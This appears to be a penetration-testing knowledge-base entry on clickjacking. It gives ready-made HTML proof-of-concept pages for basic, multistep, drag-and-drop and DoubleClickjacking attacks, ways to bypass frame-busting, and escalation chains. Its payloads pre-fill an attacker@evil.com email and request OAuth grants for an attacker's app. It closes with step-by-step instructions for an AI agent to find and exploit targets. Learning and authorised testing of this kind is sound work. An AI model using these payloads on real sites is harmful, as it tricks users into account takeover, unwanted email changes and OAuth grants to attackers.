# Clickjacking

> **Summary**: Clickjacking tricks users into clicking hidden or disguised elements on a target website by overlaying it with a transparent iframe within an attacker-controlled page.
> **Impact**: Unauthorized actions performed as the victim: account changes, fund transfers, permission grants, data deletion, credential disclosure.
> **Typical Severity**: Medium

## Detection

### Indicators

- Missing `X-Frame-Options` response header
- Missing `Content-Security-Policy: frame-ancestors` directive
- Pages with sensitive actions that can be performed with a single click (delete account, change email, grant OAuth permissions)
- Forms that accept GET parameter pre-population
- Drag-and-drop functionality on sensitive pages

### Automated Detection

- Check response headers with `curl -I https://target.com` -- look for absence of `X-Frame-Options` and `frame-ancestors`
- https://securityheaders.com -- scan for missing framing protections
- Burp Suite passive scanner flags missing frame protection headers
- Burp Clickbandit -- automated clickjacking PoC generator

### Manual Detection

1. Check for `X-Frame-Options` header:
   - `deny` -- page cannot be framed (protected)
   - `sameorigin` -- only same-origin framing allowed (protected)
   - `allow-from https://trusted.com` -- only specific origin (partially protected, not supported in all browsers)
   - Missing -- vulnerable

2. Check for CSP `frame-ancestors` directive:
   - `frame-ancestors 'none'` -- equivalent to `X-Frame-Options: deny`
   - `frame-ancestors 'self'` -- equivalent to `X-Frame-Options: sameorigin`
   - Missing -- vulnerable

3. Try embedding the target in an iframe:
```html
<iframe src="https://target.com/sensitive-action"></iframe>
```
If it renders, the page is frameable and potentially vulnerable.

4. Check for JavaScript frame-busting scripts that might prevent framing (these can often be bypassed).

## Exploitation

### Prerequisites

- Target page lacks `X-Frame-Options` and `CSP frame-ancestors` headers
- Target page contains a sensitive action performable via click(s)
- Victim must be authenticated on the target site (session cookies are sent with iframe requests)

### Step-by-Step

1. Identify a target page with a sensitive action and no framing protection
2. Determine the exact pixel coordinates of the clickable element (button, link, checkbox)
3. Create an attacker page with an invisible iframe overlaying a decoy element
4. Adjust opacity, positioning, and z-index so the victim clicks the hidden iframe
5. Host the attacker page and lure the victim to visit it
6. The victim's click triggers the action on the target site using their authenticated session

### Payloads

#### Basic Clickjacking PoC

```html
<html>
<head>
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 470px;
        left: 60px;
        z-index: 1;
    }
</style>
</head>
<body>
<div>Click here to claim your prize!</div>
<iframe src="https://target.com/delete-account"></iframe>
</body>
</html>
```

#### Clickjacking with Form Pre-Population via GET Parameters

```html
<html>
<head>
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 470px;
        left: 60px;
        z-index: 1;
    }
</style>
</head>
<body>
<div>Click me</div>
<iframe src="https://target.com/email?email=attacker@evil.com"></iframe>
</body>
</html>
```

#### Multistep Clickjacking

```html
<html>
<head>
<style>
    iframe {
        position: relative;
        width: 500px;
        height: 500px;
        opacity: 0.0001;
        z-index: 2;
    }
    .firstClick, .secondClick {
        position: absolute;
        top: 330px;
        left: 60px;
        z-index: 1;
    }
    .secondClick {
        left: 210px;
    }
</style>
</head>
<body>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://target.com/account-settings"></iframe>
</body>
</html>
```

#### Drag-and-Drop Clickjacking

Inject attacker-controlled data into a target form via drag-and-drop:

```html
<html>
<head>
<style>
    iframe {
        width: 1000px;
        height: 675px;
        border: none;
        opacity: 0.3;
    }
    #payload {
        position: absolute;
        top: 20px;
    }
    .target-area {
        position: fixed;
        background: #F00;
        height: 26px;
        width: 250px;
        left: 41.5%;
        top: 340px;
    }
</style>
</head>
<body>
<div class="target-area">Drop here</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts"
    src="https://target.com/profile"></iframe>
<div id="payload" draggable="true"
    ondragstart="event.dataTransfer.setData('text/plain', 'attacker@evil.com')">
    <h3>DRAG ME TO THE RED BOX</h3>
</div>
</body>
</html>
```

#### Text Field Injection via Clickjacking

Pre-populate an input field by combining iframe with GET parameters and tricking the user into clicking submit:

```html
<html>
<head>
<style>
    iframe {
        position: relative;
        width: 600px;
        height: 800px;
        opacity: 0.0001;
        z-index: 2;
    }
    .click-target {
        position: absolute;
        top: 505px;
        left: 120px;
        z-index: 1;
        padding: 10px 20px;
        background: #4CAF50;
        color: white;
        cursor: pointer;
    }
</style>
</head>
<body>
<div class="click-target">Submit Survey</div>
<iframe src="https://target.com/settings?email=attacker@evil.com"></iframe>
</body>
</html>
```

#### DoubleClickjacking

Exploits the timing difference between mousedown and onclick events during a double-click. On the first click, the attacker page is shown. Between clicks, the page swaps to the victim page, and the second click lands on the legitimate button:

```html
<html>
<body>
<button id="bait" ondblclick="swap()">Double-click to verify you are human</button>
<script>
function swap() {
    document.getElementById('bait').style.display = 'none';
    var iframe = document.createElement('iframe');
    iframe.src = 'https://target.com/authorize?client_id=attacker_app';
    iframe.style.width = '100%';
    iframe.style.height = '100%';
    iframe.style.border = 'none';
    iframe.style.position = 'fixed';
    iframe.style.top = '0';
    iframe.style.left = '0';
    document.body.appendChild(iframe);
}
</script>
</body>
</html>
```

This bypasses traditional clickjacking protections because it only requires framing the victim page for a brief moment during the double-click sequence. Effective against OAuth permission dialogs and similar single-click sensitive actions.

### Proof of Concept

1. Confirm the target page is frameable (no `X-Frame-Options` or `frame-ancestors`)
2. Identify the sensitive button coordinates using browser developer tools
3. Create a basic PoC HTML page with invisible iframe and a visible decoy element
4. Adjust positioning until the decoy aligns with the target button
5. Test by opening the PoC and clicking -- verify the action executes on the target
6. Set opacity to a non-zero small value (0.0001) for the report to demonstrate the overlay

## Bypasses

### Frame-Busting Script Bypass via sandbox Attribute

If the target uses JavaScript frame-busting (`if (top !== self) { top.location = self.location; }`), neutralize it with the `sandbox` attribute:

```html
<iframe src="https://target.com"
    sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
```

The `sandbox` attribute without `allow-top-navigation` prevents the iframe from redirecting the parent window, defeating frame-busting scripts.

### Double Framing

Some frame-busting scripts check `if (top !== self)`. Double framing can bypass this:

```html
<!-- attacker-outer.html -->
<iframe src="attacker-inner.html"></iframe>

<!-- attacker-inner.html -->
<iframe src="https://target.com"></iframe>
```

The target's script sees `top` as the outer attacker page, but the check may not handle nested framing correctly.

### DoubleClickjacking (Bypasses All Frame Protections)

DoubleClickjacking bypasses `X-Frame-Options`, `frame-ancestors`, and JavaScript frame-busters because the victim page only needs to be rendered briefly during the double-click timing window. The attacker exploits the gap between mousedown (on attacker page) and the second click (on the swapped-in victim page).

### IE/Legacy Browser Bypasses

- Older IE versions have inconsistent `X-Frame-Options` support
- `allow-from` directive is not supported in Chrome/Firefox -- if the server only uses `allow-from`, modern browsers ignore it and the page becomes frameable
- Some implementations incorrectly apply `X-Frame-Options` only on the main response but not on redirected responses

### SVG Filter UI Redressing

Apply CSS SVG filters to cross-origin iframes to visually distort or recontextualize the victim page content. The iframe pixels are processed through the SVG filter graph, allowing the attacker to warp, overlay, or mask UI elements without touching the DOM. This can make sensitive actions appear to be innocuous interactions.

## Escalation

- **Clickjacking + CSRF**: If the target has CSRF tokens but is vulnerable to clickjacking, the victim's own authenticated click submits the request with valid tokens, bypassing CSRF protection entirely
- **Clickjacking + XSS**: If a self-XSS exists (user can only trigger XSS on their own account), use clickjacking to trick the victim into submitting the XSS payload via a prepopulated form
- **OAuth Token Theft**: Frame the OAuth authorization endpoint and trick the user into clicking "Allow", granting the attacker's application access to the victim's account
- **One-Click Account Changes**: Chain with GET-parameter form prepopulation to change email, password, or security settings with a single click
- **Credential Harvesting via Drag-and-Drop**: Trick users into dragging sensitive data (tokens, codes) from the framed page into attacker-controlled elements
- **Browser Extension Autofill Exploitation**: Target password manager extension UI elements that render near focused inputs -- by hiding/occluding the extension dropdown, a click can autofill credentials into attacker-controlled fields (no iframe needed)

## Tools

| Tool | Usage |
|---|---|
| Burp Clickbandit | Automated clickjacking PoC generator built into Burp Suite |
| Burp Suite | Passive scanner detects missing framing headers |
| securityheaders.com | Online tool to check for missing X-Frame-Options and CSP headers |
| Browser DevTools | Inspect element coordinates for precise PoC alignment |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for this vulnerability.

### Phase 1: Discovery
1. Send a request to `<TARGET>` and inspect response headers for framing protections:
   ```bash
   curl -s -I "https://<TARGET>/<SENSITIVE_PAGE>" | grep -iE "(x-frame-options|frame-ancestors)"
   ```
2. Check for `X-Frame-Options` header: `DENY`, `SAMEORIGIN`, or `ALLOW-FROM` (note: `ALLOW-FROM` is not supported in Chrome/Firefox)
3. Check for `Content-Security-Policy: frame-ancestors` directive: `'none'`, `'self'`, or specific origins
4. If neither header is present, the page is frameable and potentially vulnerable
5. Identify pages with sensitive single-click actions: delete account, change email, grant OAuth permissions, enable 2FA, transfer funds
6. Use https://securityheaders.com to scan `<TARGET>` for missing framing protections

### Phase 2: Validation
1. If no framing protection headers are found, embed the page in an iframe and confirm it renders:
   ```html
   <iframe src="https://<TARGET>/<SENSITIVE_PAGE>" width="500" height="500"></iframe>
   ```
2. If JavaScript frame-busting is present (e.g., `if (top !== self) top.location = self.location`), bypass with `sandbox` attribute:
   ```html
   <iframe src="https://<TARGET>/<SENSITIVE_PAGE>" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
   ```
3. Check if the sensitive action can be triggered with a single click (button, link, checkbox)
4. Check if form fields can be pre-populated via GET parameters (e.g., `?email=attacker@evil.com`)
5. Verify the victim must be authenticated (session cookies are sent within the iframe)

### Phase 3: Exploitation
1. **Basic clickjacking**: Create a PoC with invisible iframe overlaying a decoy button:
   ```html
   <style>
     iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
     div { position:absolute; top:<Y>px; left:<X>px; z-index:1; }
   </style>
   <div>Click here to claim your prize!</div>
   <iframe src="https://<TARGET>/<SENSITIVE_PAGE>"></iframe>
   ```
2. **Multistep clickjacking**: For actions requiring multiple clicks (confirm dialogs), create sequential decoy elements positioned over each step
3. **Drag-and-drop clickjacking**: If the target has drag-and-drop functionality, create a PoC that tricks the user into dragging attacker data into the framed form
4. **DoubleClickjacking**: Exploit double-click timing to bypass all frame protections:
   ```html
   <button ondblclick="swap()">Double-click to verify</button>
   <script>function swap(){ /* swap to victim page between clicks */ }</script>
   ```
5. Use browser DevTools to identify the exact pixel coordinates of the target button for precise alignment
6. Set iframe opacity to `0.0001` (not `0`, which may be blocked by some browsers)

### Phase 4: Escalation
1. Chain with [CSRF](csrf.md) bypass: if the target uses CSRF tokens, clickjacking forces the victim's own click to submit the legitimate form with valid tokens
2. Chain with Self-[XSS](xss.md): if a self-XSS exists, use clickjacking to trick the victim into submitting the XSS payload via a prepopulated form
3. **OAuth token theft**: Frame the OAuth authorization page and trick the user into clicking "Allow" for the attacker's application
4. **Settings manipulation**: Change email, disable 2FA, or grant API access through invisible clicks
5. **Credential harvesting via drag-and-drop**: Trick users into dragging tokens or codes from the framed page into attacker-controlled elements

## Decision Tree

```
Check response headers for <TARGET>/<SENSITIVE_PAGE>
├── X-Frame-Options: DENY or frame-ancestors 'none' → Not frameable → Check DoubleClickjacking
├── X-Frame-Options: SAMEORIGIN or frame-ancestors 'self' → Only same-origin framing → Check DoubleClickjacking
├── X-Frame-Options: ALLOW-FROM (only) → Chrome/Firefox ignore this → Frameable in modern browsers
├── No framing headers
│   ├── JS frame-busting present?
│   │   ├── Yes → Bypass with sandbox="allow-forms allow-scripts allow-same-origin"
│   │   └── No → Fully frameable
│   ├── Sensitive single-click action exists? → Basic clickjacking PoC
│   ├── Multi-step action? → Multistep clickjacking PoC
│   └── Form fields pre-populatable via GET params? → Clickjacking + form pre-fill
└── DoubleClickjacking (bypasses ALL frame protections)
    └── Sensitive action triggered by click on framed page during double-click timing window
```

## Success Criteria
- The victim performs an unintended sensitive action (email change, OAuth grant, account deletion) by clicking on the attacker's page
- The iframe is invisible (opacity 0.0001) and the decoy element is aligned over the target button
- The action is executed using the victim's authenticated session within the framed page

---

## References

| URL | Description |
|---|---|
| https://portswigger.net/web-security/clickjacking | PortSwigger clickjacking learning materials and labs |
| https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html | OWASP Clickjacking Defense Cheat Sheet |
| https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html | DoubleClickjacking research and code examples |
| https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors | MDN frame-ancestors CSP documentation |
| https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options | MDN X-Frame-Options documentation |
| https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors | W3C CSP frame-ancestors specification |
